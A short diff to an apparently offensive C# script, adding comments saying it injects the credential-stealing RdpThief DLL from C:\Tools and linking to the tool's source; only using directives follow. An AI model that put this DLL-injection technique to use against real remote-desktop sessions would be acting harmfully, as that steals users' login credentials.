@@ -1,4 +1,6 @@
-﻿using System;
+//Please note that this technique relies on DLL injection, this script assumes that the DLL is located in C:\Tools\RdpThief.dll
+//You can find RdpThief here: https://github.com/0x09AL/RdpThief
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
